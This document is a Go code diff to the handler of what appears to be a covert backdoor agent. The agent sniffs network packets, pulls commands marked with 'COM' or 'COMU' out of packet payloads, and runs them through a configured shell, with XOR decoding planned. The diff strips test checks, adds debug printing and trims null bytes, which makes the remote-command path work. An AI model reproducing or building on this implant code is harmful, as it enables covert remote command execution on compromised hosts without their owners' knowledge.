@@ -1,7 +1,7 @@
 package handler
 
 import (
-	_ "bytes"
+	"bytes"
 	"fmt"
 	"log"
 	_ "os"
@@ -63,7 +63,9 @@ func StartSniffer(newAgent agent.Agent) {
 func harvestInfo(packet gopacket.Packet) (string, string) {
 	app := packet.ApplicationLayer()
 	if app != nil {
+		fmt.Println(app.LayerContents())
 		final := decode(app.LayerContents())
+		fmt.Println(final)
 		index := strings.Index(final, "COM")
 		if strings.Contains(final, "COMU") {
 			return final[index+4:], "COMU"
@@ -79,18 +81,6 @@ func harvestInfo(packet gopacket.Packet) (string, string) {
 }
 
 func runCommand(msg string, newAgent agent.Agent) {
-	//msgArr := strings.Split(msg, " ")
-	if newAgent.ShellType != "/bin/sh" {
-		fmt.Print("something wrong type")
-	}
-	if newAgent.ShellFlag != "-c" {
-		fmt.Print("something wrong flag")
-	}
-
-	if msg != "echo bruh" {
-		fmt.Println("something wrong message")
-	}
-	output1, err := exec.Command("/bin/sh", "-c", "echo bruh").Output()
 	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()
 
 	if err != nil {
@@ -98,7 +88,6 @@ func runCommand(msg string, newAgent agent.Agent) {
 		fmt.Println("Couldn't execute command")
 	}
 
-	fmt.Println(string(output1))
 	fmt.Println(string(output))
 } //should this go in agent?
 
@@ -107,6 +96,7 @@ func resync() {
 } //should this go in agent?
 
 func decode(content []byte) string {
+	content = bytes.Trim(content, "\x00")
 	return string(content)
 	//TODO fix later with single XOR byte
 }
